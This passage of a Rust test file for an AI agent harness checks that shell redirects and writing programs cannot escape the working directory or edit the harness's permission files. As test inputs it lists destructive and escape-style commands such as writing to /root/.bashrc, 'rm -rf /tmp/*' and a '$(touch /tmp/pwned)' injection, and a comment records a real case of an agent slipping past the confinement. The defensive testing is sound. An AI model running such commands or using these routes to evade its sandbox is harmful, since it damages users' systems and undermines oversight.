                leviath_mcp::ServerAuth {
                    access_token: "live-token".to_string(),
                    expires_at: u64::MAX,
                    ..Default::default()
                },
            );
            store
                .save(&leviath_mcp::AuthStore::default_path().unwrap())
                .unwrap();

            let config = Config {
                mcp_servers: vec![MCPServerConfig::http("remote", format!("{base}/mcp"))],
                ..Config::default()
            };
            ToolRegistry::build(std::env::temp_dir(), &config).await
        })
        .await;

        assert_eq!(registry.mcp_tool_defs.len(), 1);
        assert_eq!(registry.mcp_tool_defs[0].name, "remote__remote_tool");
        registry.shutdown().await;
    }

    #[tokio::test]
    async fn build_skips_mcp_server_that_fails_to_connect() {
        // A nonexistent command fails to spawn, exercising the `Err(e)` arm
        // ("Failed to connect MCP server - skipping") instead of the
        // success arm above.
        with_tracing(|| {});
        let registry = with_temp_home(|| async {
            let config = config_with_mcp_server("definitely-not-a-real-binary-xyz", vec![]);
            ToolRegistry::build(std::env::temp_dir(), &config).await
        })
        .await;

        assert!(registry.mcp_tool_defs.is_empty());
    }

    #[tokio::test]
    async fn build_skips_http_server_whose_token_cannot_be_refreshed() {
        // An HTTP server with a stored-but-expired token whose refresh endpoint
        // is dead: the bearer cannot be resolved, so build logs and skips it
        // rather than connecting unauthenticated.
        with_tracing(|| {});
        let registry = with_temp_home(|| async {
            // Seed an expired token with an unreachable refresh endpoint.
            let mut store = leviath_mcp::AuthStore::default();
            store.set(
                "remote",
                leviath_mcp::ServerAuth {
                    token_endpoint: "http://127.0.0.1:1/token".to_string(),
                    access_token: "expired".to_string(),
                    refresh_token: Some("good".to_string()),
                    expires_at: 1,
                    ..Default::default()
                },
            );
            store
                .save(&leviath_mcp::AuthStore::default_path().unwrap())
                .unwrap();

            let config = Config {
                mcp_servers: vec![MCPServerConfig::http("remote", "http://127.0.0.1:1/mcp")],
                ..Config::default()
            };
            ToolRegistry::build(std::env::temp_dir(), &config).await
        })
        .await;
        assert!(registry.mcp_tool_defs.is_empty());
    }

    /// An agent's grants are the ones in Leviath's own grant file.
    #[tokio::test]
    async fn an_agent_reads_the_default_grant_file() {
        let file = agent_grants(leviath_core::CredentialStoreKind::File);
        assert!(file.path().ends_with("mcp-auth.json"));
    }

    #[tokio::test]
    async fn shutdown_with_no_servers_is_a_noop() {
        let config = Config::default();
        let registry = ToolRegistry::build(std::env::temp_dir(), &config).await;
        registry.shutdown().await; // must not panic
    }
}

#[cfg(test)]
mod policy_tests {
    use super::*;
    use std::collections::HashMap;

    // ─── spawn_raw_graph ──────────────────────────────────────────────────

    /// Approving one raw graph is remembered as approving raw graphs, never
    /// as approving `spawn_agent`, and approving a spawn of an installed
    /// blueprint is remembered under the tool.
    #[test]
    fn a_raw_graph_approval_is_remembered_under_its_own_permission() {
        let raw = serde_json::json!({"source": {"graph": {}}});
        let named = serde_json::json!({"source": {"blueprint": "coder"}});
        assert_eq!(
            session_approval_keys("spawn_agent", &raw),
            vec![leviath_tools::SPAWN_RAW_GRAPH_PERMISSION.to_string()]
        );
        assert_eq!(
            session_approval_keys("spawn_agent", &named),
            vec!["spawn_agent".to_string()]
        );
    }

    // ─── clamp_by_effect ──────────────────────────────────────────────────

    fn shell_call(command: &str) -> serde_json::Value {
        serde_json::json!({ "command": command })
    }

    // Named rather than a closure per call site: one function has one
    // coverage-mapping instance, so the tests where the resolver is
    // deliberately never reached do not each leave an unexecuted body behind.
    fn deny() -> ToolPolicy {
        ToolPolicy::Deny
    }

    fn allow() -> ToolPolicy {
        ToolPolicy::Allow
    }

    // ─── Redirect confinement ────────────────────────────────────────────────

    /// The asymmetry this closes. Under `--yolo` the write policy resolves to
    /// `Allow`, so the clamp above passes the call through; with no separate
    /// check the target is never looked at, while `write_file` on the same path
    /// is refused by `resolve_within`. The shell must not be the spelling that
    /// works.
    #[test]
    fn a_redirect_outside_the_workdir_is_refused() {
        let dir = tempfile::tempdir().expect("tempdir");
        for command in [
            "echo pwn > /root/.bashrc",
            "cat notes.md > ../escaped.txt",
            "echo x >> ../../etc/hosts",
        ] {
            let refusal = escaping_write_refusal("shell", &shell_call(command), dir.path());
            assert!(
                refusal.is_some(),
                "{command:?} writes outside the workdir and must be refused"
            );
            let refusal = refusal.expect("just asserted");
            assert!(
                refusal.contains("outside the working directory"),
                "{refusal}"
            );
        }
    }

    /// The control. Without it the test above passes against a version that
    /// refuses every redirect, which would break every agent that writes a file.
    #[test]
    fn a_redirect_inside_the_workdir_is_allowed() {
        let dir = tempfile::tempdir().expect("tempdir");
        for command in [
            "echo x > out.txt",
            "echo x > sub/dir/out.txt",
            "cat a >> ./notes.md",
            // A discarded write names no path at all.
            "ninja > /dev/null 2>&1",
            "cat a 2>/dev/null",
            // Not a shell call, so not this function's business.
            "ls",
        ] {
            assert_eq!(
                escaping_write_refusal("shell", &shell_call(command), dir.path()),
                None,
                "{command:?} stays inside and must not be refused"
            );
        }
    }

    /// A redirect the tokenizer cannot read past is refused outright.
    ///
    /// A backtick, an unterminated quote and an unbalanced `$(` each stop the
    /// line being read as commands. Answering "no targets found" there would
    /// let the redirect through under `--yolo` while the same path in
    /// `write_file` is refused. Every redirect operator, under every
    /// construct, against a path outside.
    #[test]
    fn no_unreadable_redirect_escapes_the_workdir() {
        let dir = tempfile::tempdir().expect("tempdir");
        let constructs: [&str; 4] = [
            "echo `id`",
            "echo 'unterminated",
            "echo \"unterminated",
            "echo $(id",
        ];
        let mut checked = 0;
        for head in constructs {
            for op in [">", ">>", "2>", "&>", ">|", "<>"] {
                let command = format!("{head} {op} /tmp/escaped.txt");
                let refusal = escaping_write_refusal("shell", &shell_call(&command), dir.path());
                let refusal = refusal.unwrap_or_default();
                assert!(refusal.contains("cannot be read"), "{command:?}: {refusal}");
                checked += 1;
            }
        }
        assert_eq!(checked, 24);
    }

    /// A heredoc no longer hides a redirect beside it: on a POSIX shell the
    /// line reads as commands, the body is stdin data, and the `>` target is
    /// named and held to the same confinement as `write_file`. On `cmd.exe`,
    /// which has no heredocs, the construct stays unreadable and is refused
    /// outright. Refused either way - what changed is only how precisely.
    #[test]
    fn a_heredoc_redirect_outside_the_workdir_is_refused_on_both_shells() {
        let dir = tempfile::tempdir().expect("tempdir");
        for head in ["cat <<EOF", "cat <<'EOF'"] {
            for op in [">", ">>", "2>", "&>", ">|", "<>"] {
                let command = format!("{head} {op} /tmp/escaped.txt\nx\nEOF");
                let posix =
                    escaping_write_refusal_for("shell", &shell_call(&command), dir.path(), true)
                        .unwrap_or_default();
                assert!(
                    posix.contains("outside the working directory"),
                    "{command:?}: {posix}"
                );
                let cmd_exe =
                    escaping_write_refusal_for("shell", &shell_call(&command), dir.path(), false)
                        .unwrap_or_default();
                assert!(cmd_exe.contains("cannot be read"), "{command:?}: {cmd_exe}");
            }
        }
    }

    /// The fix this fence's precision buys: a heredoc that writes nowhere, or
    /// redirects inside the tree, runs on a POSIX shell instead of being
    /// refused for the `>` characters inside its body. Inline python is the
    /// motivating case - any script of substance holds a `->` or a
    /// comparison, and every one was refused. On `cmd.exe` the same lines
    /// stay refused, since there the body lines would really run as commands.
    #[test]
    fn a_posix_heredoc_with_an_inside_or_no_redirect_is_allowed() {
        let dir = tempfile::tempdir().expect("tempdir");
        for command in [
            "python3 - <<'EOF'\ndef f(x) -> int:\n    return x > 3\nEOF",
            "cat <<EOF > inside.txt\na > b\nEOF",
        ] {
            assert_eq!(
                escaping_write_refusal_for("shell", &shell_call(command), dir.path(), true),
                None,
                "{command:?} stays inside and must not be refused"
            );
            let cmd_exe =
                escaping_write_refusal_for("shell", &shell_call(command), dir.path(), false)
                    .unwrap_or_default();
            assert!(cmd_exe.contains("cannot be read"), "{command:?}: {cmd_exe}");
        }
    }

    /// The body of an unquoted heredoc expands, so a substitution inside it
    /// really runs and could write; with a redirect somewhere on the line, the
    /// whole construct is refused rather than read as data.
    #[test]
    fn an_unquoted_heredoc_body_with_a_substitution_is_still_refused() {
        let dir = tempfile::tempdir().expect("tempdir");
        for command in [
            "cat <<EOF > inside.txt\n$(touch /tmp/pwned)\nEOF",
            "cat <<EOF > inside.txt\n`touch /tmp/pwned`\nEOF",
        ] {
            let refusal =
                escaping_write_refusal_for("shell", &shell_call(command), dir.path(), true)
                    .unwrap_or_default();
            assert!(refusal.contains("cannot be read"), "{command:?}: {refusal}");
        }
    }

    /// The controls. A line the tokenizer cannot read but that redirects
    /// nothing is not this check's business (it still prompts, as it always
    /// did), and an ordinary redirect inside the tree is still fine.
    #[test]
    fn an_unreadable_line_with_no_redirect_is_not_refused() {
        let dir = tempfile::tempdir().expect("tempdir");
        for command in ["cat <<EOF\nx\nEOF", "echo `id`", "echo 'open", "echo $(id"] {
            assert_eq!(
                escaping_write_refusal("shell", &shell_call(command), dir.path()),
                None,
                "{command:?} redirects nothing"
            );
        }
        assert_eq!(
            escaping_write_refusal("shell", &shell_call("echo ok > inside.txt"), dir.path()),
            None
        );
    }

    /// Stated rather than hidden: an unreadable line is refused even when its
    /// redirect would have landed inside the tree, because "inside" is a
    /// judgement about a path this could not actually read.
    #[test]
    fn an_unreadable_redirect_inside_the_workdir_is_refused_too() {
        let dir = tempfile::tempdir().expect("tempdir");
        let refusal =
            escaping_write_refusal("shell", &shell_call("echo `id` > inside.txt"), dir.path())
                .unwrap_or_default();
        assert!(refusal.contains("cannot be read"), "{refusal}");
        assert!(refusal.contains("write_file"), "{refusal}");
    }

    /// The live escape (#1069): the coder's `cd /tmp && rm -rf uidtest &&
    /// mkdir uidtest && ... > project.godot` was allowed, because only the
    /// redirect was judged and the `cd` was followed for it alone. Every
    /// writing program on the line is now judged from where the `cd` puts
    /// it, and the refusal names the program and where it lands.
    #[test]
    fn a_writing_program_outside_the_workdir_is_refused() {
        let dir = tempfile::tempdir().expect("tempdir");
        let refused = |command: &str| {
            escaping_write_refusal("shell", &shell_call(command), dir.path()).unwrap_or_default()
        };
        let live = refused("cd /tmp && rm -rf uidtest && mkdir uidtest && echo x > project.godot");
        assert!(
            // `/tmp` is a rooted path with no drive on Windows, where `cd`
            // lands it at `C:\tmp`; the spelling differs, the escape does not.
            live.contains("Shell `rm` writes to 'uidtest', which may land at '")
                && live.contains("uidtest', outside the working directory"),
            "{live}"
        );
        let later = refused("cd /tmp/uidtest && echo x > bad.log");
        assert!(
            later.contains("Shell redirect writes to 'bad.log'"),
            "{later}"
        );
        for command in [
            "rm -rf /tmp/uidtest",
            "rmdir /tmp/uidtest",
            "mkdir -p /tmp/uidtest/a",
            "cp a.txt /tmp/a.txt",
            "cp -t /tmp a.txt",
            "mv a.txt ../a.txt",
            "mv /tmp/a.txt a.txt",
            "touch /tmp/stamp",
            "echo x | tee /tmp/out.log",
            "ln -s a.txt /tmp/a.txt",
            "truncate -s 0 /tmp/a.txt",
            "dd if=a.img of=/tmp/a.img",
            "install -m 644 a.txt /tmp/a.txt",
            "git -C /tmp/repo commit -m x",
            "git init /tmp/repo",
            "git clone url /tmp/repo",
            "git worktree add /tmp/wt",
            "echo x > ~/.bashrc",
            "rm -rf ~/.cache/x",
            "rm -rf /tmp/*",
            "rm -rf .*",
            "mkdir -p {/tmp,x}/y",
            "(cd /tmp && rm -rf x)",
        ] {
            let refusal = refused(command);
            assert!(
                refusal.contains("outside the working directory")
                    || refusal.contains("could reach anywhere"),
                "{command:?}: {refusal}"
            );
        }
    }

    /// Each case the fence can no longer pass on: a `cd` it does not follow
    /// (to a variable, or in any construct), and a target only the shell can
    /// name. Both used to be left to the write policy, which an autonomous
    /// run answers yes.
    #[test]
    fn a_write_the_fence_cannot_place_is_refused() {
        let dir = tempfile::tempdir().expect("tempdir");
        let refused = |command: &str| {
            escaping_write_refusal("shell", &shell_call(command), dir.path()).unwrap_or_default()
        };
        for command in [
            "cd $DIR && rm -rf build",
            "cd \"$(mktemp -d)\" && mkdir x",
            "{ cd /tmp; }; rm -rf x",
            "if true; then cd /tmp; fi; mkdir x",
            "cd - && touch x",
            "popd; rm x",
        ] {
            let refusal = refused(command);
            assert!(
                refusal.contains("after a move that cannot be followed"),
                "{command:?}: {refusal}"
            );
        }
        for command in [
            "rm -rf $DIR",
            "rm -rf \"$TMPDIR/x\"",
            "mkdir -p $(mktemp -d)/x",
            "cp a.txt $OUT",
            "echo x > $OUT",
            "dd if=a of=$OUT",
            "git -C $REPO reset --hard",
        ] {
            let refusal = refused(command);
            assert!(
                refusal.contains("only the shell can name"),
                "{command:?}: {refusal}"
            );
        }
    }

    /// The control: the same programs inside the workdir, after a `cd` that
    /// stays inside, and the read-only commands the issue names, are not
    /// refused.
    #[test]
    fn a_writing_program_inside_the_workdir_and_a_read_are_allowed() {
        let dir = tempfile::tempdir().expect("tempdir");
        std::fs::create_dir_all(dir.path().join("src")).expect("src");
        for command in [
            "rm -rf build",
            "rmdir empty",
            "mkdir -p build/out",
            "mkdir -p src/{a,b}",
            "cp a.txt b.txt",
            "cp /etc/hosts hosts.txt",
            "mv a.txt src/a.txt",
            "touch src/stamp",
            "echo x | tee out.log",
            "ln -s a.txt b.txt",
            "truncate -s 0 out.log",
            "dd if=/dev/zero of=blank.img bs=1 count=1",
            "install -m 644 a.txt src/a.txt",
            "git -C src commit -m x",
            "git -C /tmp/repo log",
            "git init src/repo",
            "cd src && rm -rf build && mkdir build",
            "cd src || mkdir -p a; touch b | tee c",
            "rm -f *.tmp",
            "rm -f src/*.o",
            "ls /tmp",
            "cat /etc/hosts",
            "ls -la /tmp && cat /etc/hosts | head -1",
            "cd /tmp && ls",
            "echo rm -rf /tmp/x",
        ] {
            assert_eq!(
                escaping_write_refusal("shell", &shell_call(command), dir.path()),
                None,
                "{command:?} stays inside or writes nothing, and must not be refused"
            );
        }
    }

    /// An absolute path *into* the workdir is inside it, so the check cannot be
    /// a naive "is it absolute" test.
    ///
    /// Built from a real temp directory, so on Windows it carries real
    /// backslashes - the case that breaks if the tokenizer reads a backslash as
    /// an escape, which `cmd.exe` does not.
    #[test]
    fn an_absolute_path_into_the_workdir_is_allowed() {
        let dir = tempfile::tempdir().expect("tempdir");
        let inside = dir.path().join("out.txt");
        let command = format!("echo x > {}", inside.display());
        assert_eq!(
            escaping_write_refusal("shell", &shell_call(&command), dir.path()),
            None
        );
    }

    /// The alias is the same tool, and a non-shell tool is not this check's
    /// business - `write_file` has its own confinement.
    #[test]
    fn the_refusal_covers_the_alias_and_ignores_other_tools() {
        let dir = tempfile::tempdir().expect("tempdir");
        assert!(
            escaping_write_refusal("bash", &shell_call("echo x > /root/.bashrc"), dir.path(),)
                .is_some()
        );
        assert_eq!(
            escaping_write_refusal(
                "write_file",
                &serde_json::json!({ "path": "/root/.bashrc", "content": "x" }),
                dir.path(),
            ),
            None
        );
        // A shell call with no `command` argument names nothing to check.
        assert_eq!(
            escaping_write_refusal("shell", &serde_json::json!({}), dir.path()),
            None
        );
    }

    // ─── Write accounting ────────────────────────────────────────────────────

    /// What each tool declares it will write, which is what lets an oversized
    /// `write_file` be stopped before a byte lands.
    #[test]
    fn a_declaring_tool_reports_its_size_and_a_shell_call_does_not() {
        assert_eq!(
            declared_write_bytes("write_file", &serde_json::json!({"content": "abcd"})),
            Some(4)
        );
        assert_eq!(
            declared_write_bytes("edit_file", &serde_json::json!({"new_str": "abc"})),
            Some(3)
        );
        // An install is charged for the script it writes, so a run's write
        // ceiling covers the global tools directory too.
        assert_eq!(
            declared_write_bytes("install_tool", &serde_json::json!({"source": "// @tool t"})),
            Some(10)
        );
        // A shell redirect's bytes never pass through Leviath, so there is
        // nothing to declare - `None` means "measure afterwards", not "writes
        // nothing".
        assert_eq!(
            declared_write_bytes("shell", &shell_call("echo x > out.txt")),
            None
        );
        // A declaring tool with the field missing declares nothing either.
        assert_eq!(
            declared_write_bytes("write_file", &serde_json::json!({})),
            None
        );
    }

    /// Measuring runs after the call, so a declaring tool contributes nothing
    /// here - it was charged when it was checked - and a shell call is charged
    /// what its targets actually weigh.
    #[test]
    fn measuring_charges_the_shell_and_not_the_declaring_tools() {
        let dir = tempfile::tempdir().expect("tempdir");
        std::fs::write(dir.path().join("out.txt"), "0123456789").expect("write");

        assert_eq!(
            measured_write_bytes("shell", &shell_call("echo x > out.txt"), dir.path()),
            10
        );
        // Already charged at check time.
        assert_eq!(
            measured_write_bytes(
                "write_file",
                &serde_json::json!({"path": "a", "content": "abcd"}),
                dir.path()
            ),
            0
        );
        // A target the command never created costs nothing: a failed command
        // must not spend the run's budget on a file it did not write.
        assert_eq!(
            measured_write_bytes("shell", &shell_call("echo x > absent.txt"), dir.path()),
            0
        );
        // Not a writing call at all.
        assert_eq!(
            measured_write_bytes("shell", &shell_call("ls -la"), dir.path()),
            0
        );
        // An absolute target is measured where it points, not joined onto the
        // workdir - which would name a path that does not exist and charge the
        // run nothing for a file it really wrote.
        let absolute = dir.path().join("out.txt");
        let command = format!("echo x > {}", absolute.display());
        assert_eq!(
            measured_write_bytes("shell", &shell_call(&command), dir.path()),
            10
        );
        // A shell call with no `command` argument names nothing to measure.
        assert_eq!(
            measured_write_bytes("shell", &serde_json::json!({}), dir.path()),
            0
        );
        // And a tool that is neither.
        assert_eq!(
            measured_write_bytes("read_file", &serde_json::json!({"path": "a"}), dir.path()),
            0
        );
    }

    /// The property this exists for: a model that finds `write_file` refused
    /// must not be able to reach for `>` instead.
    #[test]
    fn a_denied_write_tool_denies_a_shell_redirect() {
        assert_eq!(
            clamp_by_effect(
                "shell",
                &shell_call("echo pwn > /root/.bashrc"),
                ToolPolicy::Allow,
                &deny,
            ),
            ToolPolicy::Deny
        );
        // Including under the alias, since that is the same tool.
        assert_eq!(
            clamp_by_effect(
                "bash",
                &shell_call("echo pwn >> ~/.profile"),
                ToolPolicy::Allow,
                &deny,
            ),
            ToolPolicy::Deny
        );
    }

    /// The clamp only ever tightens. Allowing `write_file` grants nothing the
    /// shell's own policy had not already granted.
    #[test]
    fn the_clamp_never_loosens_a_shell_call() {
        assert_eq!(
            clamp_by_effect(
                "shell",
                &shell_call("echo x > out"),
                ToolPolicy::Ask,
                &allow,
            ),
            ToolPolicy::Ask
        );
        assert_eq!(
            clamp_by_effect(
                "shell",
                &shell_call("echo x > out"),
                ToolPolicy::Deny,
                &allow,
            ),
            ToolPolicy::Deny
        );
    }

    /// A call that writes nothing is not the write tool's business, or every
    /// `ls` would answer to `write_file`.
    #[test]
    fn a_call_that_writes_nothing_is_untouched() {
        for command in ["ls -la", "cat a 2>/dev/null", "grep x f", "sort < in"] {
            assert_eq!(
                clamp_by_effect("shell", &shell_call(command), ToolPolicy::Allow, &deny,),
                ToolPolicy::Allow,
                "{command:?} writes nothing"
            );
        }
    }

    /// The write policy is resolved lazily, because this runs on *every* tool
    /// call and almost none of them are a writing shell command. Resolving it
    /// eagerly made a `read_file` pay for a lookup that was thrown away.
    #[test]
    fn the_write_policy_is_resolved_only_when_a_call_actually_writes() {
        let calls = std::cell::Cell::new(0);
        let resolve = || {
            calls.set(calls.get() + 1);
            ToolPolicy::Deny
        };

        clamp_by_effect(
            "read_file",
            &serde_json::json!({"path": "a"}),
            ToolPolicy::Allow,
            &resolve,
        );
        clamp_by_effect("shell", &shell_call("ls -la"), ToolPolicy::Allow, &resolve);
        clamp_by_effect(
            "shell",
            &shell_call("cat a 2>/dev/null"),
            ToolPolicy::Allow,
            &resolve,
        );
        assert_eq!(
            calls.get(),
            0,
            "nothing here writes, so nothing should resolve"
        );

        clamp_by_effect(
            "shell",
            &shell_call("echo x > f"),
            ToolPolicy::Allow,
            &resolve,
        );
        assert_eq!(calls.get(), 1, "a writing call resolves it exactly once");
    }

    /// Only the shell can spell a write this way, and a call with no readable
    /// command has nothing to clamp against.
    #[test]
    fn a_non_shell_tool_and_a_malformed_call_are_untouched() {
        assert_eq!(
            clamp_by_effect(
                "read_file",
                &serde_json::json!({ "path": "a > b" }),
                ToolPolicy::Allow,
                &deny,
            ),
            ToolPolicy::Allow
        );
        assert_eq!(
            clamp_by_effect(
                "shell",
                &serde_json::json!({ "not_a_command": 1 }),
                ToolPolicy::Allow,
                &deny,
            ),
            ToolPolicy::Allow
        );
    }

    // ─── what a blueprint may loosen ──────────────────────────────────────

    /// Every shipped agent's `tool_permissions` mean the same with the
    /// user's opt-in as without it: none of them relies on loosening a tool
    /// the runtime's allowlist does not name. Driven from the bundled
    /// blueprints, not a hand-copied table, so it stays true if either the
    /// agents or the allowlist move.
    #[test]
    fn the_bundled_agents_resolve_unchanged() {
        for agent in crate::bundled::BUNDLED_AGENTS {
            let (_, text) = agent
                .files
                .iter()
                .find(|(rel, _)| rel.ends_with(leviath_blueprint::FILE_NAME))
                .expect("every bundled agent ships a blueprint");
            let file = leviath_blueprint::BlueprintFile::parse(text)
                .expect("every bundled agent's blueprint parses");
            let perms: HashMap<String, String> = file
                .graph
                .tool_permissions
                .iter()
                .map(|(tool, policy)| {
                    let word = serde_json::to_value(policy).expect("a policy serializes");
                    (
                        tool.to_string(),
                        word.as_str().unwrap_or_default().to_string(),
                    )
                })
                .collect();
            assert!(
                perms.values().all(|p| !p.is_empty()),
                "{}: every policy reads as a word",
                agent.name
            );
            for (tool, declared) in &perms {
                let clamped = resolve_policy(
                    tool,
                    true,
                    &HashMap::new(),
                    &HashMap::new(),
                    &perms,
                    &HashMap::new(),
                    false,
                );
                let unclamped = resolve_policy(
                    tool,
                    true,
                    &HashMap::new(),
                    &HashMap::new(),
                    &perms,
                    &HashMap::new(),
                    true,
                );
                assert_eq!(
                    clamped, unclamped,
                    "{}'s {tool} = {declared:?} changed meaning under the allowlist",
                    agent.name
                );
            }
        }
    }

    // ─── ToolRegistry construction ─────────────────────────────────────────

    #[tokio::test]
    async fn test_tool_registry_build_no_mcp() {
        let config = Config::default();
        let workdir = std::env::current_dir().unwrap();
        let registry = ToolRegistry::build(workdir, &config).await;

        // Should have built-in tools
        assert!(!registry.builtin_names.is_empty());
        // Should have no MCP tools
        assert!(registry.mcp_tool_defs.is_empty());
    }

    #[tokio::test]
    async fn test_tool_registry_all_tool_defs() {
        let config = Config::default();
        let workdir = std::env::current_dir().unwrap();
        let registry = ToolRegistry::build(workdir, &config).await;

        let all_defs = registry.all_tool_defs();
        assert!(!all_defs.is_empty());

        // Should include known built-in tools
        let names: Vec<&str> = all_defs.iter().map(|t| t.name.as_str()).collect();
        assert!(names.contains(&"read_file"));
    }

    #[tokio::test]
    async fn test_tool_registry_builtin_names_consistent() {
        let config = Config::default();
        let workdir = std::env::current_dir().unwrap();
        let registry = ToolRegistry::build(workdir, &config).await;

        // builtin_names should come from builtins.names()
        let names_from_builtins: HashSet<String> = registry.builtins.names().into_iter().collect();
        assert_eq!(registry.builtin_names, names_from_builtins);
    }

    // ─── session_approval_keys ────────────────────────────────────────────

    fn shell_args(command: &str) -> serde_json::Value {
        serde_json::json!({ "command": command })
    }

    /// `bash` is an alias for `shell`, so it must get the same treatment rather
    /// than falling through to the by-name branch.
    #[test]
    fn the_bash_alias_is_scoped_like_shell() {
        assert_eq!(
            session_approval_keys("bash", &shell_args("ls -la")),
            ["shell:ls"]
        );
    }

    /// Non-shell tools keep keying on the tool name: their arguments do not
    /// widen what the tool can reach the way a command string does.
    #[test]
    fn other_tools_are_keyed_by_name() {
        assert_eq!(
            session_approval_keys("read_file", &serde_json::json!({ "path": "a" })),
            ["read_file"]
        );
    }

    /// A shell call with no `command` argument is malformed; it cannot be
    /// characterized, so it cannot be granted.
    #[test]
    fn a_shell_call_without_a_command_is_not_grantable() {
        assert!(session_approval_keys("shell", &serde_json::json!({})).is_empty());
    }

    #[tokio::test]
    async fn test_tool_registry_shutdown_no_panic() {
        let config = Config::default();
        let workdir = std::env::current_dir().unwrap();
        let registry = ToolRegistry::build(workdir, &config).await;
        registry.shutdown().await;
    }

    #[tokio::test]
    async fn test_tool_registry_all_defs_includes_subagent() {
        let config = Config::default();
        let workdir = std::env::current_dir().unwrap();
        let registry = ToolRegistry::build(workdir, &config).await;
        let all_defs = registry.all_tool_defs();
        let names: Vec<&str> = all_defs.iter().map(|t| t.name.as_str()).collect();
        // Should include subagent tools
        assert!(names.contains(&"spawn_agent"));
    }

    #[tokio::test]
    async fn test_tool_registry_all_defs_includes_all_subagent_tools() {
        let config = Config::default();
        let workdir = std::env::current_dir().unwrap();
        let registry = ToolRegistry::build(workdir, &config).await;
        let all_defs = registry.all_tool_defs();
        let names: Vec<&str> = all_defs.iter().map(|t| t.name.as_str()).collect();

        for expected in &[
            "spawn_agent",
            "check_agent",
            "wait_for_agent",
            "send_to_agent",
            "kill_agent",
        ] {
            assert!(names.contains(expected));
        }
    }

    // ─── ToolRegistry.builtin_names includes known builtins ───────────────

    #[tokio::test]
    async fn test_tool_registry_builtin_names_has_expected_tools() {
        let config = Config::default();
        let workdir = std::env::current_dir().unwrap();
        let registry = ToolRegistry::build(workdir, &config).await;

        // These should be in builtin_names
        for name in &["read_file", "list_dir"] {
            assert!(registry.builtin_names.contains(*name));
        }

        // Subagent tools should NOT be in builtin_names
        assert!(!registry.builtin_names.contains("spawn_agent"));
    }

    // ─── ToolRegistry.all_tool_defs does not duplicate ────────────────────

    #[tokio::test]
    async fn test_tool_registry_all_defs_no_mcp_when_none_configured() {
        let config = Config::default();
        let workdir = std::env::current_dir().unwrap();
        let registry = ToolRegistry::build(workdir, &config).await;
        assert!(registry.mcp_tool_defs.is_empty());

        // Total defs = builtins + subagent tools
        let all_defs = registry.all_tool_defs();
        let builtin_count = registry.builtins.tool_defs().len();
        let subagent_count = leviath_tools::BuiltinTools::subagent_tool_defs().len();
        assert_eq!(all_defs.len(), builtin_count + subagent_count);
    }

    // ─── ToolRegistry build with failing MCP server ────────────────────────
    // Exercises the Err branch (lines 52-58): a bad command fails to connect.

    #[tokio::test]
    async fn test_tool_registry_build_with_failing_mcp_server() {
        use leviath_mcp::MCPServerConfig;

        let bad_server = MCPServerConfig::stdio(
            "bad-server",
            "/nonexistent/binary/that/does/not/exist",
            vec![],
        );
        let config = Config {
            mcp_servers: vec![bad_server],
            ..Config::default()
        };

        let workdir = std::env::current_dir().unwrap();
        // Should not panic; the error branch is non-fatal (just a tracing::warn)
        let registry = ToolRegistry::build(workdir, &config).await;

        // MCP tool defs should be empty because connection failed
        assert!(registry.mcp_tool_defs.is_empty());
        // Built-ins should still be present
        assert!(!registry.builtin_names.is_empty());
    }

    // ─── the permission-file lock ─────────────────────────────────────────

    /// A home with the permission files where a real install keeps them, and
    /// a workdir beside it, so `~`, absolute and relative spellings all have
    /// somewhere real to land.
    struct LockRig {
        _dir: tempfile::TempDir,
        home: std::path::PathBuf,
        workdir: std::path::PathBuf,
        protected: Vec<ProtectedPath>,
    }

    fn lock_rig() -> LockRig {
        let dir = tempfile::tempdir().unwrap();
        std::fs::create_dir_all(dir.path().join("home")).unwrap();
        // Canonical from the start, as a real home is: the `$HOME` spellings
        // are built by stripping it off each protected path.
        let home = std::fs::canonicalize(dir.path().join("home")).unwrap();
        let data = home.join(".leviath");
        std::fs::create_dir_all(data.join("tools")).unwrap();
        std::fs::write(data.join("config.toml"), "").unwrap();
        std::fs::write(data.join("yolo.toml"), "").unwrap();
        let workdir = dir.path().join("work");
        std::fs::create_dir_all(workdir.join("src")).unwrap();
        std::fs::write(workdir.join("config.toml"), "").unwrap();
        let protected = vec![
            ProtectedPath {
                path: data.join("config.toml"),
                label: "config.toml",
            },
            ProtectedPath {
                path: data.join("yolo.toml"),
                label: "yolo.toml",
            },
            ProtectedPath {
                path: data.join("tools"),
                label: "the global tool scripts",
            },
        ];
        LockRig {
            _dir: dir,
            home,
            workdir: std::fs::canonicalize(&workdir).unwrap(),
            protected,
        }
    }

    fn lock_check(rig: &LockRig, tool: &str, args: serde_json::Value) -> Option<String> {
        protected_path_refusal(tool, &args, &rig.workdir, Some(&rig.home), &rig.protected)
    }

    /// A word whose `..` climbs out of the start of a relative workdir names
    /// nothing, on every platform, before any protected place is consulted.
    #[test]
    fn a_word_that_climbs_out_names_no_protected_place() {
        let word = format!("{}x", "../".repeat(6));
        assert!(protected_hit(&word, std::path::Path::new("a/b"), None, &[]).is_none());
    }

    #[test]
    fn the_file_tools_may_not_write_a_permission_file() {
        let rig = lock_rig();
        let yolo = rig.home.join(".leviath/yolo.toml");
        let refusal =
            lock_check(&rig, "write_file", serde_json::json!({"path": yolo})).expect("refused");
        assert!(refusal.contains("[denied]"), "{refusal}");
        assert!(refusal.contains("is yolo.toml"), "{refusal}");
        assert!(refusal.contains("lock_permission_files"), "{refusal}");
        // A `..` that climbs out of the root names nothing, so it names no
        // protected place either.
        let climbs_out = format!("{}etc/x", "../".repeat(40));
        assert!(lock_check(&rig, "write_file", serde_json::json!({"path": climbs_out})).is_none());
        // Relative to the workdir, through the data dir, and by `~`.
        assert!(
            lock_check(
                &rig,
                "edit_file",
                serde_json::json!({"path": "../home/.leviath/config.toml"})
            )
            .is_some()
        );
        assert!(
            lock_check(
                &rig,
                "write_file",
                serde_json::json!({"path": "~/.leviath/tools/x.rhai"})
            )
            .is_some()
        );
        // The workdir's own config.toml is the project's, not Leviath's.
        assert!(
            lock_check(
                &rig,
                "write_file",
                serde_json::json!({"path": "config.toml"})
            )
            .is_none()
        );
        assert!(
            lock_check(
                &rig,
                "write_file",
                serde_json::json!({"path": "src/main.rs"})
            )
            .is_none()
        );
        // No path, a path that is not a string, another tool, or no lock:
        // nothing to refuse.
        assert!(lock_check(&rig, "write_file", serde_json::json!({})).is_none());
        assert!(lock_check(&rig, "write_file", serde_json::json!({"path": 5})).is_none());
        assert!(lock_check(&rig, "shell", serde_json::json!({"command": 5})).is_none());
        // A path nothing along which exists (a relative workdir that is not
        // there) names nothing checkable, so it matches nothing.
        assert!(
            protected_path_refusal(
                "write_file",
                &serde_json::json!({"path": "yolo.toml"}),
                std::path::Path::new("no-such-relative-workdir"),
                Some(&rig.home),
                &rig.protected,
            )
            .is_none()
        );
